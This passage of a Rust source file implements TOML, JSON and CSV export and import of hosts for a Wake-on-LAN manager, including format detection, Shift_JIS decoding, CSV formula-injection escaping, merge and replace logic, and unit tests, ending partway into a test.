//! Export and import of hosts (and optionally settings) as TOML, JSON or CSV.
//!
//! * TOML / JSON use the `config.toml` structure (`schema_version`, optional `settings`,
//!   `hosts`); unknown host keys are carried along.
//! * CSV has one row per host with the columns [`CSV_COLUMNS`] (lists separated by `;`).
//!   Tab-separated input (`.tsv`, or a header line with tabs and no commas) is read the same
//!   way.
//!   Export writes UTF-8 with a BOM (Excel). Import accepts UTF-8 (BOM optional) and falls
//!   back to Shift_JIS (Windows-31J, what Japanese Excel saves) when the bytes are not UTF-8.
//!   Cells that a spreadsheet would run as a formula (`=`, `+`, `-`, `@`, tab, CR first) are
//!   exported with a leading `'`, which import removes again.
//! * Imported names, groups and notes lose control characters (like editor input), and
//!   records whose unknown keys are nested more than [`MAX_NESTING`] levels are refused.
//! * Import matches incoming hosts to existing ones by id, then by name (width-folded,
//!   case-insensitive). [`ImportMode::Merge`] updates / adds; [`ImportMode::Replace`] makes the
//!   host list exactly the imported one (keeping ids of matched hosts).
//! * Everything is pure: import into a clone of the config for a dry run, or inside
//!   [`crate::store::Store::update`] to save.

use std::fmt;
use std::path::Path;
use std::str::FromStr;

use serde::{Deserialize, Serialize};
use uuid::Uuid;

use crate::error::{Error, Field, FieldError, FieldIssue, Result};
use crate::model::{
    Config, Host, HostDraft, HostId, ProbeMethod, SCHEMA_VERSION, Settings, check_field,
};
use crate::normalize;

/// File format.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Format {
    /// TOML (same layout as `config.toml`).
    Toml,
    /// JSON (same layout as `config.toml`).
    Json,
    /// CSV, one host per row.
    Csv,
}

impl Format {
    /// `"toml"` / `"json"` / `"csv"` (also the file extension).
    pub const fn as_str(self) -> &'static str {
        match self {
            Format::Toml => "toml",
            Format::Json => "json",
            Format::Csv => "csv",
        }
    }

    /// Format from a file extension (case-insensitive).
    pub fn from_path(path: &Path) -> Option<Format> {
        let ext = path.extension()?.to_str()?.to_ascii_lowercase();
        match ext.as_str() {
            "toml" => Some(Format::Toml),
            "json" => Some(Format::Json),
            "csv" | "txt" | "tsv" => Some(Format::Csv),
            _ => None,
        }
    }

    /// Guesses the format of import data: explicit hint, then the path's extension, then the
    /// content (JSON object / array, TOML with `hosts` / `schema_version`, else CSV).
    pub fn detect(bytes: &[u8], hint: Option<Format>, path: Option<&Path>) -> Format {
        if let Some(f) = hint.or_else(|| path.and_then(Format::from_path)) {
            return f;
        }
        let text = String::from_utf8_lossy(strip_bom(bytes));
        let t = text.trim_start();
        if t.starts_with('{')
            || (t.starts_with('[') && serde_json::from_str::<serde_json::Value>(t).is_ok())
        {
            return Format::Json;
        }
        if let Ok(tbl) = toml::from_str::<toml::Table>(t)
            && (tbl.contains_key("hosts") || tbl.contains_key("schema_version"))
        {
            return Format::Toml;
        }
        Format::Csv
    }
}

impl fmt::Display for Format {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.as_str())
    }
}

impl FromStr for Format {
    type Err = String;
    fn from_str(s: &str) -> std::result::Result<Self, String> {
        match s.trim().to_ascii_lowercase().as_str() {
            "toml" => Ok(Format::Toml),
            "json" => Ok(Format::Json),
            "csv" => Ok(Format::Csv),
            _ => Err("expected one of: toml | json | csv".to_owned()),
        }
    }
}

/// CSV column order written by [`export`].
pub const CSV_COLUMNS: &[&str] = &[
    "id",
    "name",
    "mac",
    "address",
    "group",
    "notes",
    "port",
    "secureon",
    "targets",
    "broadcast",
    "interfaces",
    "probe",
    "tcp_ports",
];

fn strip_bom(b: &[u8]) -> &[u8] {
    b.strip_prefix(b"\xEF\xBB\xBF").unwrap_or(b)
}

/// First characters that make Excel and other spreadsheets read a CSV cell as a formula.
const FORMULA_START: [char; 6] = ['=', '+', '-', '@', '\t', '\r'];

/// `true` when the cell, after any leading `'`, starts with a formula character.
fn looks_like_formula(cell: &str) -> bool {
    cell.trim_start_matches('\'')
        .starts_with(FORMULA_START.as_slice())
}

/// CSV export: a cell that a spreadsheet would run as a formula (`=1+1`, `@SUM(..)`,
/// `-2+3`, ...) gets a leading `'`, which spreadsheets show as text (CWE-1236). A cell that
/// already starts with `'` before such a character gets one more, so that
/// [`csv_unguard`] restores every value exactly.
fn csv_guard(cell: String) -> String {
    if looks_like_formula(&cell) {
        format!("'{cell}")
    } else {
        cell
    }
}

/// CSV import: undoes [`csv_guard`].
fn csv_unguard(cell: &str) -> &str {
    match cell.strip_prefix('\'') {
        Some(rest) if looks_like_formula(rest) => rest,
        _ => cell,
    }
}

#[derive(Serialize)]
struct ExportDoc<'a> {
    schema_version: u32,
    #[serde(skip_serializing_if = "Option::is_none")]
    settings: Option<&'a Settings>,
    hosts: Vec<&'a Host>,
}

/// Export options.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ExportOptions {
    /// Output format.
    pub format: Format,
    /// Also write `[settings]` (TOML / JSON only; ignored for CSV).
    pub include_settings: bool,
}

/// Serializes `hosts` (and optionally `settings`). CSV output starts with a UTF-8 BOM.
/// Note that SecureOn passwords are exported in plain text.
pub fn export_hosts(
    hosts: &[&Host],
    settings: Option<&Settings>,
    format: Format,
) -> Result<Vec<u8>> {
    let doc = ExportDoc {
        schema_version: SCHEMA_VERSION,
        settings,
        hosts: hosts.to_vec(),
    };
    match format {
        Format::Toml => {
            let body = toml::to_string(&doc).map_err(|e| Error::Serialize(e.to_string()))?;
            Ok(format!("# WoL Manager export\n{body}").into_bytes())
        }
        Format::Json => {
            let mut v =
                serde_json::to_vec_pretty(&doc).map_err(|e| Error::Serialize(e.to_string()))?;
            v.push(b'\n');
            Ok(v)
        }
        Format::Csv => {
            let mut w = csv::WriterBuilder::new()
                .terminator(csv::Terminator::CRLF)
                .from_writer(Vec::new());
            let ser = |e: csv::Error| Error::Serialize(e.to_string());
            w.write_record(CSV_COLUMNS).map_err(ser)?;
            for h in hosts {
                let d = HostDraft::from_host(h);
                let targets = h
                    .targets
                    .iter()
                    .map(ToString::to_string)
                    .collect::<Vec<_>>()
                    .join(";");
                let ports = h
                    .tcp_ports
                    .iter()
                    .map(u16::to_string)
                    .collect::<Vec<_>>()
                    .join(";");
                w.write_record(
                    [
                        h.id.to_string(),
                        d.name,
                        d.mac,
                        d.address,
                        d.group,
                        d.notes,
                        d.port,
                        d.secureon,
                        targets,
                        h.broadcast.to_string(),
                        h.interfaces.join(";"),
                        h.probe.map(|p| p.to_string()).unwrap_or_default(),
                        ports,
                    ]
                    .map(csv_guard),
                )
                .map_err(ser)?;
            }
            let body = w
                .into_inner()
                .map_err(|e| Error::Serialize(e.to_string()))?;
            let mut out = b"\xEF\xBB\xBF".to_vec();
            out.extend(body);
            Ok(out)
        }
    }
}

/// Exports every host of `cfg`.
pub fn export(cfg: &Config, opts: &ExportOptions) -> Result<Vec<u8>> {
    let hosts: Vec<&Host> = cfg.hosts.iter().collect();
    let settings = (opts.include_settings && opts.format != Format::Csv).then_some(&cfg.settings);
    export_hosts(&hosts, settings, opts.format)
}

/// How imported hosts are combined with the existing ones.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Default, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum ImportMode {
    /// Update matching hosts, add the others, keep hosts not in the file.
    #[default]
    Merge,
    /// The host list becomes exactly the imported hosts.
    Replace,
}

/// Import options.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct ImportOptions {
    /// Merge or replace.
    pub mode: ImportMode,
    /// Force a format instead of detecting it.
    pub format: Option<Format>,
    /// Skip invalid records (listed in the summary) instead of failing.
    pub skip_invalid: bool,
    /// Also replace `[settings]` when the file has them (TOML / JSON).
    pub include_settings: bool,
}

/// One parsed record.
#[derive(Debug, Clone, PartialEq)]
pub struct ImportRecord {
    /// Where it came from (`row 3`, `hosts[2]`).
    pub location: String,
    /// The host, or why it is invalid.
    pub host: std::result::Result<Host, RecordError>,
    /// The record carried a usable id.
    pub had_id: bool,
    /// Fields present in the record (names from [`CSV_COLUMNS`], without `id`). When the
    /// record matches an existing host, only these fields overwrite it.
    pub present: Vec<&'static str>,
}

/// Maps a key to its [`CSV_COLUMNS`] name (without `id`).
fn field_key(k: &str) -> Option<&'static str> {
    CSV_COLUMNS.iter().copied().find(|c| *c != "id" && *c == k)
}

/// Copies the `present` fields (and extra keys) of `incoming` onto `existing`.
fn overlay(existing: &Host, incoming: &Host, present: &[&str]) -> Host {
    let mut h = existing.clone();
    for p in present {
        match *p {
            "name" => h.name = incoming.name.clone(),
            "mac" => h.mac = incoming.mac,
            "address" => h.address = incoming.address.clone(),
            "group" => h.group = incoming.group.clone(),
            "notes" => h.notes = incoming.notes.clone(),
            "port" => h.port = incoming.port,
            "secureon" => h.secureon = incoming.secureon,
            "targets" => h.targets = incoming.targets.clone(),
            "broadcast" => h.broadcast = incoming.broadcast,
            "interfaces" => h.interfaces = incoming.interfaces.clone(),
            "probe" => h.probe = incoming.probe,
            "tcp_ports" => h.tcp_ports = incoming.tcp_ports.clone(),
            _ => {}
        }
    }
    for (k, v) in &incoming.extra {
        h.extra.insert(k.clone(), v.clone());
    }
    h
}

/// Why a record is invalid.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum RecordError {
    /// Field validation failed.
    Fields {
        /// Name as given, if any.
        name: Option<String>,
        /// Problems.
        errors: Vec<FieldError>,
    },
    /// The record could not be decoded (English message).
    Malformed {
        /// Message.
        message: String,
    },
}

impl fmt::Display for RecordError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            RecordError::Fields { name, errors } => {
                if let Some(n) = name {
                    write!(f, "{n:?}: ")?;
                }
                let list: Vec<String> = errors.iter().map(ToString::to_string).collect();
                f.write_str(&list.join(", "))
            }
            RecordError::Malformed { message } => f.write_str(message),
        }
    }
}

/// Parsed import file.
#[derive(Debug, Clone, PartialEq)]
pub struct ImportData {
    /// Detected / forced format.
    pub format: Format,
    /// Records in file order.
    pub records: Vec<ImportRecord>,
    /// `[settings]`, if the file has them.
    pub settings: Option<Settings>,
    /// Notes such as a newer `schema_version` or the Shift_JIS fallback.
    pub warnings: Vec<String>,
}

/// A record that was not imported.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct ImportSkip {
    /// Where.
    pub location: String,
    /// Why.
    pub error: RecordError,
}

/// What an import did (or would do, on a clone).
#[derive(Debug, Clone, PartialEq, Eq, Default, Serialize)]
pub struct ImportSummary {
    /// Names of added hosts.
    pub added: Vec<String>,
    /// Names of changed hosts.
    pub updated: Vec<String>,
    /// Names of matched hosts that were already identical.
    pub unchanged: Vec<String>,
    /// Records not imported.
    pub skipped: Vec<ImportSkip>,
    /// Names of hosts removed ([`ImportMode::Replace`]).
    pub removed: Vec<String>,
    /// `[settings]` were replaced.
    pub settings_replaced: bool,
    /// Notes from parsing.
    pub warnings: Vec<String>,
}

/// Decodes CSV bytes: UTF-8 (BOM stripped) or, when invalid, Shift_JIS. Returns the text and
/// whether the fallback was used.
pub fn decode_csv_text(bytes: &[u8]) -> (String, bool) {
    let b = strip_bom(bytes);
    match std::str::from_utf8(b) {
        Ok(s) => (s.to_owned(), false),
        Err(_) => {
            let (text, _had_errors) = encoding_rs::SHIFT_JIS.decode_without_bom_handling(b);
            (text.into_owned(), true)
        }
    }
}

/// Deepest nesting of tables / arrays accepted in an imported host or `[settings]` (unknown
/// keys are carried along as they are). `config.toml` must stay readable: the TOML parser
/// gives up at a nesting depth far below what JSON allows.
pub const MAX_NESTING: usize = 20;

fn nesting(v: &toml::Value) -> usize {
    match v {
        toml::Value::Array(a) => 1 + a.iter().map(nesting).max().unwrap_or(0),
        toml::Value::Table(t) => 1 + t.values().map(nesting).max().unwrap_or(0),
        _ => 0,
    }
}

/// `true` when `v` serializes to tables / arrays nested deeper than [`MAX_NESTING`].
fn too_deep<T: Serialize>(v: &T) -> bool {
    toml::Value::try_from(v).is_ok_and(|v| nesting(&v) > MAX_NESTING)
}

fn too_deep_message() -> String {
    format!("unknown keys are nested more than {MAX_NESTING} levels deep")
}

fn validate_host(h: &Host) -> std::result::Result<(), RecordError> {
    if too_deep(h) {
        return Err(RecordError::Malformed {
            message: too_deep_message(),
        });
    }
    let mut errors = Vec::new();
    if let Err(i) = check_field(Field::Name, &h.name) {
        errors.push(FieldError::new(Field::Name, i));
    }
    if !h.mac.is_usable() {
        errors.push(FieldError::new(Field::Mac, FieldIssue::MacNotUnicast));
    }
    if h.port == Some(0) {
        errors.push(FieldError::new(Field::Port, FieldIssue::InvalidPort));
    }
    if let Err(i) = crate::addr::check_port_list(&h.tcp_ports) {
        errors.push(FieldError::new(Field::TcpPorts, i));
    }
    if errors.is_empty() {
        Ok(())
    } else {
        Err(RecordError::Fields {
            name: Some(h.name.clone()),
            errors,
        })
    }
}

fn record_from_host(location: String, mut h: Host, present: Vec<&'static str>) -> ImportRecord {
    // Like the editor: no control characters (terminal escapes) in names, groups and notes.
    h.name = normalize::clean_single_line(&h.name);
    h.group = h
        .group
        .as_deref()
        .map(normalize::clean_single_line)
        .filter(|g| !g.is_empty());
    h.notes = h
        .notes
        .as_deref()
        .map(normalize::clean_notes)
        .filter(|n| !n.trim().is_empty());
    let had_id = !h.id.is_nil();
    let host = validate_host(&h).map(|()| h);
    ImportRecord {
        location,
        host,
        had_id,
        present,
    }
}

type RawHost = (String, std::result::Result<Host, String>, Vec<&'static str>);

fn parse_structured(
    format: Format,
    hosts: Vec<RawHost>,
    settings: Option<std::result::Result<Settings, String>>,
    schema: Option<i64>,
) -> Result<ImportData> {
    let mut warnings = Vec::new();
    if let Some(v) = schema
        && v > i64::from(SCHEMA_VERSION)
    {
        warnings.push(format!(
            "the file has schema_version {v}; newer fields are kept as unknown keys"
        ));
    }
    let settings = match settings {
        None => None,
        Some(Ok(s)) if too_deep(&s) => {
            warnings.push(format!("settings ignored: {}", too_deep_message()));
            None
        }
        Some(Ok(s)) => Some(s),
        Some(Err(e)) => {
            warnings.push(format!("settings ignored: {e}"));
            None
        }
    };
    let records = hosts
        .into_iter()
        .map(|(loc, r, present)| match r {
            Ok(h) => record_from_host(loc, h, present),
            Err(message) => ImportRecord {
                location: loc,
                host: Err(RecordError::Malformed { message }),
                had_id: false,
                present,
            },
        })
        .collect();
    Ok(ImportData {
        format,
        records,
        settings,
        warnings,
    })
}

fn parse_toml(text: &str, path: Option<&Path>) -> Result<ImportData> {
    let tbl: toml::Table = toml::from_str(text).map_err(|e| {
        let (line, column) = e
            .span()
            .map(|s| crate::model::line_col(text, s.start))
            .map(|(l, c)| (Some(l), Some(c)))
            .unwrap_or((None, None));
        Error::ConfigParse {
            path: path.map(Path::to_path_buf),
            line,
            column,
            message: e.message().to_owned(),
        }
    })?;
    let hosts = match tbl.get("hosts") {
        Some(toml::Value::Array(a)) => a
            .iter()
            .enumerate()
            .map(|(i, v)| {
                let present = v
                    .as_table()
                    .map(|t| t.keys().filter_map(|k| field_key(k)).collect())
                    .unwrap_or_default();
                (
                    format!("hosts[{i}]"),
                    Host::deserialize(v.clone()).map_err(|e| e.to_string()),
                    present,
                )
            })
            .collect(),
        Some(_) => {
            return Err(Error::Import {
                location: Some("hosts".into()),
                message: "`hosts` must be an array of tables".into(),
            });
        }
        None => Vec::new(),
    };
    let settings = tbl
        .get("settings")
        .map(|v| Settings::deserialize(v.clone()).map_err(|e| e.to_string()));
    let schema = tbl.get("schema_version").and_then(toml::Value::as_integer);
    parse_structured(Format::Toml, hosts, settings, schema)
}

fn parse_json(text: &str, path: Option<&Path>) -> Result<ImportData> {
    let v: serde_json::Value = serde_json::from_str(text).map_err(|e| Error::ConfigParse {
        path: path.map(Path::to_path_buf),
        line: Some(e.line()),
        column: Some(e.column()),
        message: e.to_string(),
    })?;
    let (items, settings, schema) = match &v {
        serde_json::Value::Array(a) => (a.clone(), None, None),
        serde_json::Value::Object(o) => (
            match o.get("hosts") {
                Some(serde_json::Value::Array(a)) => a.clone(),
                Some(_) => {
                    return Err(Error::Import {
                        location: Some("hosts".into()),
                        message: "`hosts` must be an array".into(),
                    });
                }
                None => Vec::new(),
            },
            o.get("settings").cloned(),
            o.get("schema_version").and_then(serde_json::Value::as_i64),
        ),
        _ => {
            return Err(Error::Import {
                location: None,
                message: "expected a JSON object or array".into(),
            });
        }
    };
    let hosts = items
        .into_iter()
        .enumerate()
        .map(|(i, item)| {
            let present = item
                .as_object()
                .map(|o| o.keys().filter_map(|k| field_key(k)).collect())
                .unwrap_or_default();
            (
                format!("hosts[{i}]"),
                serde_json::from_value::<Host>(item).map_err(|e| e.to_string()),
                present,
            )
        })
        .collect();
    let settings =
        settings.map(|s| serde_json::from_value::<Settings>(s).map_err(|e| e.to_string()));
    parse_structured(Format::Json, hosts, settings, schema)
}

fn csv_column(header: &str) -> Option<&'static str> {
    let h = normalize::name_key(header).replace([' ', '_', '-'], "");
    Some(match h.as_str() {
        "id" => "id",
        "name" | "hostname" | "host" | "名前" | "ホスト名" => "name",
        "mac" | "macaddress" | "macアドレス" => "mac",
        "address" | "ip" | "ipaddress" | "ipv4" | "アドレス" | "ipアドレス" => "address",
        "group" | "グループ" => "group",
        "notes" | "note" | "memo" | "comment" | "メモ" | "備考" => "notes",
        "port" | "ポート" => "port",
        "secureon" | "password" => "secureon",
        "targets" | "target" | "送信先" => "targets",
        "broadcast" => "broadcast",
        "interfaces" | "interface" => "interfaces",
        "probe" => "probe",
        "tcpports" | "tcpport" => "tcp_ports",
        _ => return None,
    })
}

fn parse_bool_cell(s: &str) -> Option<bool> {
    match normalize::normalize_input(s)
        .trim()
        .to_ascii_lowercase()
        .as_str()
    {
        "" => None,
        "true" | "1" | "yes" | "on" | "はい" => Some(true),
        "false" | "0" | "no" | "off" | "いいえ" => Some(false),
        _ => None,
    }
}

/// Field delimiter of CSV-family input: tab for `.tsv` files, and for text whose header line
/// has tabs but no commas (tab-separated `.txt`, a paste from Excel); comma otherwise.
fn csv_delimiter(text: &str, path: Option<&Path>) -> u8 {
    let is_tsv = path
        .and_then(Path::extension)
        .and_then(|e| e.to_str())
        .is_some_and(|e| e.eq_ignore_ascii_case("tsv"));
    let header = text.lines().find(|l| !l.trim().is_empty()).unwrap_or("");
    if is_tsv || (header.contains('\t') && !header.contains(',')) {
        b'\t'
    } else {
        b','
    }
}

fn parse_csv(bytes: &[u8], path: Option<&Path>) -> Result<ImportData> {
    let (text, fallback) = decode_csv_text(bytes);
    let mut warnings = Vec::new();
    if fallback {
        warnings.push("the CSV file is not UTF-8; it was read as Shift_JIS".to_owned());
    }
    let mut rdr = csv::ReaderBuilder::new()
        .flexible(true)
        .trim(csv::Trim::None)
        .delimiter(csv_delimiter(&text, path))
        .from_reader(text.as_bytes());
    let headers = rdr
        .headers()
        .map_err(|e| Error::Import {
            location: Some("row 1".into()),
            message: e.to_string(),
        })?
        .clone();
    let cols: Vec<Option<&'static str>> = headers.iter().map(csv_column).collect();
    if !cols.contains(&Some("name")) || !cols.contains(&Some("mac")) {
        return Err(Error::Import {
            location: Some("row 1".into()),
            message: "the header row needs at least `name` and `mac` columns".into(),
        });
    }
    for (h, c) in headers.iter().zip(&cols) {
        if c.is_none() && !h.trim().is_empty() {
            warnings.push(format!("unknown column {h:?} ignored"));
        }
    }
    let present: Vec<&'static str> = cols
        .iter()
        .flatten()
        .copied()
        .filter(|c| *c != "id")
        .collect();
    let empty = Config::default();
    let mut records = Vec::new();
    for (i, row) in rdr.records().enumerate() {
        let location = format!("row {}", i + 2);
        let row = match row {
            Ok(r) => r,
            Err(e) => {
                records.push(ImportRecord {
                    location,
                    host: Err(RecordError::Malformed {
                        message: e.to_string(),
                    }),
                    had_id: false,
                    present: present.clone(),
                });
                continue;
            }
        };
        if row.iter().all(|c| c.trim().is_empty()) {
            continue;
        }
        let get = |name: &str| -> String {
            let cell = cols
                .iter()
                .position(|c| *c == Some(name))
                .and_then(|i| row.get(i))
                .unwrap_or("");
            csv_unguard(cell).to_owned()
        };
        let mut draft = HostDraft {
            name: get("name"),
            mac: get("mac"),
            address: get("address"),
            group: get("group"),
            notes: get("notes"),
            port: get("port"),
            secureon: get("secureon"),
            targets: get("targets"),
            tcp_ports: get("tcp_ports"),
            ..HostDraft::default()
        };
        let mut malformed: Option<String> = None;
        let bcast = get("broadcast");
        match parse_bool_cell(&bcast) {
            Some(b) => draft.broadcast = b,
            None if bcast.trim().is_empty() => {}
            None => malformed = Some(format!("invalid broadcast value {bcast:?} (true / false)")),
        }
        let probe = get("probe");
        if !probe.trim().is_empty() {
            match probe.parse::<ProbeMethod>() {
                Ok(p) => draft.probe = Some(p),
                Err(e) => malformed = Some(format!("invalid probe {probe:?}: {e}")),
            }
        }
        draft.interfaces = get("interfaces")
            .split([';', '\n', '\r'])
            .map(str::trim)
            .filter(|s| !s.is_empty())
            .map(str::to_owned)
            .collect();
        let id_text = get("id");
        let id = Uuid::parse_str(id_text.trim()).ok().filter(|u| !u.is_nil());
        let host = match (draft.build(&empty, None), malformed) {
            (Err(errs), _) => Err(RecordError::Fields {
                name: (!draft.name.trim().is_empty()).then(|| draft.name.clone()),
                errors: errs,
            }),
            (Ok(_), Some(message)) => Err(RecordError::Malformed { message }),
            (Ok(mut h), None) => {
                if let Some(id) = id {
                    h.id = id;
                }
                Ok(h)
            }
        };
        records.push(ImportRecord {
            location,
            host,
            had_id: id.is_some(),
            present: present.clone(),
        });
    }
    Ok(ImportData {
        format: Format::Csv,
        records,
        settings: None,
        warnings,
    })
}

/// Parses import data. Errors: [`Error::ConfigParse`] (TOML / JSON syntax, with line),
/// [`Error::Import`] (wrong structure or CSV header). Individual bad records do not fail
/// here; they are reported per record.
pub fn parse_import(
    bytes: &[u8],
    format: Option<Format>,
    path: Option<&Path>,
) -> Result<ImportData> {
    let fmt = Format::detect(bytes, format, path);
    match fmt {
        Format::Csv => parse_csv(bytes, path),
        Format::Toml | Format::Json => {
            let b = strip_bom(bytes);
            let text = std::str::from_utf8(b).map_err(|_| Error::Import {
                location: None,
                message: "the file is not valid UTF-8".into(),
            })?;
            if fmt == Format::Toml {
                parse_toml(text, path)
            } else {
                parse_json(text, path)
            }
        }
    }
}

fn find_match(hosts: &[Host], incoming: &Host, had_id: bool) -> Option<usize> {
    if had_id && let Some(i) = hosts.iter().position(|h| h.id == incoming.id) {
        return Some(i);
    }
    let key = normalize::name_key(&incoming.name);
    hosts
        .iter()
        .position(|h| normalize::name_key(&h.name) == key)
}

/// Applies parsed data to `cfg`. Atomic: on error `cfg` is unchanged.
///
/// Errors: [`Error::Import`] for the first invalid record unless `skip_invalid`.
pub fn apply_import(
    cfg: &mut Config,
    data: &ImportData,
    opts: &ImportOptions,
) -> Result<ImportSummary> {
    let mut summary = ImportSummary {
        warnings: data.warnings.clone(),
        ..ImportSummary::default()
    };
    let mut work = cfg.clone();
    if opts.include_settings
        && let Some(s) = &data.settings
    {
        if work.settings != *s {
            work.settings = s.clone();
        }
        summary.settings_replaced = true;
    }
    let original = cfg.hosts.clone();
    let mut result: Vec<Host> = match opts.mode {
        ImportMode::Merge => original.clone(),
        ImportMode::Replace => Vec::new(),
    };
    let mut matched_original: Vec<bool> = vec![false; original.len()];

    let skip = |loc: &str, err: RecordError, summary: &mut ImportSummary| -> Result<()> {
        if opts.skip_invalid {
            summary.skipped.push(ImportSkip {
                location: loc.to_owned(),
                error: err,
            });
            Ok(())
        } else {
            Err(Error::Import {
                location: Some(loc.to_owned()),
                message: err.to_string(),
            })
        }
    };

    for rec in &data.records {
        let incoming = match &rec.host {
            Ok(h) => h,
            Err(e) => {
                skip(&rec.location, e.clone(), &mut summary)?;
                continue;
            }
        };
        let orig_idx = find_match(&original, incoming, rec.had_id);
        let mut host = match orig_idx {
            Some(i) => overlay(&original[i], incoming, &rec.present),
            None => incoming.clone(),
        };
        if orig_idx.is_none()
            && (host.id.is_nil()
                || !rec.had_id
                || original.iter().any(|h| h.id == host.id)
                || result.iter().any(|h| h.id == host.id))
        {
            host.id = Uuid::new_v4();
        }
        // Where does it go in `result`, and is the name free?
        let slot = result.iter().position(|h| h.id == host.id);
        let key = normalize::name_key(&host.name);
        let clash = result
            .iter()
            .enumerate()
            .any(|(j, h)| Some(j) != slot && normalize::name_key(&h.name) == key);
        let already_imported = orig_idx.is_some_and(|i| matched_original[i]);
        if clash || already_imported {
            skip(
                &rec.location,
                RecordError::Fields {
                    name: Some(host.name.clone()),
                    errors: vec![FieldError::new(Field::Name, FieldIssue::DuplicateName)],
                },
                &mut summary,
            )?;
            continue;
        }
        if let Some(i) = orig_idx {
            matched_original[i] = true;
        }
        match (slot, orig_idx) {
            (Some(j), Some(i)) => {
                if original[i] == host {
                    summary.unchanged.push(host.name.clone());
                } else {
                    summary.updated.push(host.name.clone());
                }
                result[j] = host;
            }
            (None, Some(i)) => {
                if original[i] == host {
                    summary.unchanged.push(host.name.clone());
                } else {
                    summary.updated.push(host.name.clone());
                }
                result.push(host);
            }
            (_, None) => {
                summary.added.push(host.name.clone());
                result.push(host);
            }
        }
    }
    if opts.mode == ImportMode::Replace {
        summary.removed = original
            .iter()
            .zip(&matched_original)
            .filter(|(_, m)| !**m)
            .map(|(h, _)| h.name.clone())
            .collect();
    }
    work.hosts = result;
    *cfg = work;
    Ok(summary)
}

/// [`parse_import`] + [`apply_import`].
pub fn import(
    cfg: &mut Config,
    bytes: &[u8],
    path: Option<&Path>,
    opts: &ImportOptions,
) -> Result<ImportSummary> {
    let data = parse_import(bytes, opts.format, path)?;
    apply_import(cfg, &data, opts)
}

/// Dry run: what [`import`] would do, without changing `cfg`.
pub fn preview(
    cfg: &Config,
    bytes: &[u8],
    path: Option<&Path>,
    opts: &ImportOptions,
) -> Result<ImportSummary> {
    let mut c = cfg.clone();
    import(&mut c, bytes, path, opts)
}

/// Ids of the hosts that an import would add or update, for UIs that want to highlight
/// them (computed on a clone).
pub fn affected_ids(before: &Config, after: &Config) -> Vec<HostId> {
    after
        .hosts
        .iter()
        .filter(|h| before.get(h.id) != Some(*h))
        .map(|h| h.id)
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cfg() -> Config {
        Config::from_toml(
            r#"
[settings.wake]
repeat = 5

[[hosts]]
id = "5f0c6a1e-3b7d-4f5e-9a51-2d6c1f0e8b44"
name = "NAS"
mac = "00:11:22:33:44:55"
address = "192.168.1.10"
group = "Home"
notes = "書斎の NAS"
future = "kept"

[[hosts]]
id = "9d7e2b10-8c4f-4a36-b1e2-6f3a0c5d7e91"
name = "Lab-PC"
mac = "AA:BB:CC:DD:EE:FF"
targets = ["10.0.20.255", "relay.lan:9"]
interfaces = ["Ethernet 2"]
tcp_ports = [3389, 22]
probe = "tcp"
broadcast = false
"#,
        )
        .unwrap()
        .0
    }

    #[test]
    fn round_trip_all_formats() {
        let c = cfg();
        for format in [Format::Toml, Format::Json, Format::Csv] {
            let bytes = export(
                &c,
                &ExportOptions {
                    format,
                    include_settings: true,
                },
            )
            .unwrap();
            assert_eq!(Format::detect(&bytes, None, None), format, "{format}");
            let mut empty = Config::default();
            let s = import(&mut empty, &bytes, None, &ImportOptions::default()).unwrap();
            assert_eq!(s.added.len(), 2, "{format}");
            for (a, b) in empty.hosts.iter().zip(&c.hosts) {
                assert_eq!(a.id, b.id, "{format}");
                assert_eq!(a.name, b.name);
                assert_eq!(a.mac, b.mac);
                assert_eq!(a.targets, b.targets);
                assert_eq!(a.interfaces, b.interfaces);
                assert_eq!(a.tcp_ports, b.tcp_ports);
                assert_eq!(a.broadcast, b.broadcast);
                assert_eq!(a.probe, b.probe);
                if format != Format::Csv {
                    assert_eq!(a, b, "{format}");
                }
            }
        }
    }

    #[test]
    fn csv_has_bom_and_header() {
        let bytes = export(
            &cfg(),
            &ExportOptions {
                format: Format::Csv,
                include_settings: false,
            },
        )
        .unwrap();
        assert!(bytes.starts_with(b"\xEF\xBB\xBFid,name,mac,"));
        let text = String::from_utf8(bytes).unwrap();
        assert!(text.contains("10.0.20.255;relay.lan:9"));
        assert!(text.contains("\r\n"));
    }

    #[test]
    fn toml_export_without_settings() {
        let text = String::from_utf8(
            export(
                &cfg(),
                &ExportOptions {
                    format: Format::Toml,
                    include_settings: false,
                },
            )
            .unwrap(),
        )
        .unwrap();
        assert!(!text.contains("[settings"));
        assert!(text.contains("future = \"kept\""));
    }

    /// `.tsv` (and tab-separated text without commas in the header) uses the tab delimiter.
    #[test]
    fn tab_separated_import() {
        let tsv = b"name\tmac\tgroup\nNAS\t02:00:00:00:00:01\tHome, Office\n";
        for (path, format) in [
            (Some("hosts.tsv"), None),
            (Some("HOSTS.TSV"), None),
            (Some("hosts.txt"), None),
            (None, None),
            (None, Some(Format::Csv)),
        ] {
            let data = parse_import(tsv, format, path.map(Path::new)).unwrap();
            assert_eq!(data.format, Format::Csv);
            assert_eq!(data.records.len(), 1, "{path:?}");
            let h = data.records[0].host.as_ref().unwrap();
            assert_eq!(h.name, "NAS");
            assert_eq!(h.group.as_deref(), Some("Home, Office"));
        }
        // Japanese headers, Shift_JIS, tabs.
        let text = "名前\tMAC アドレス\r\nサーバー\t00:11:22:33:44:66\r\n";
        let (sjis, _, _) = encoding_rs::SHIFT_JIS.encode(text);
        let data = parse_import(&sjis, None, Some(Path::new("hosts.tsv"))).unwrap();
        assert_eq!(data.records[0].host.as_ref().unwrap().name, "サーバー");
        // Comma CSV is unaffected, also with tabs inside a cell.
        let csv = b"name,mac,notes\nNAS,02:00:00:00:00:01,a\tb\n";
        let data = parse_import(csv, None, Some(Path::new("hosts.csv"))).unwrap();
        let h = data.records[0].host.as_ref().unwrap();
        assert_eq!(h.notes.as_deref(), Some("a\tb"));
    }

    #[test]
    fn shift_jis_csv() {
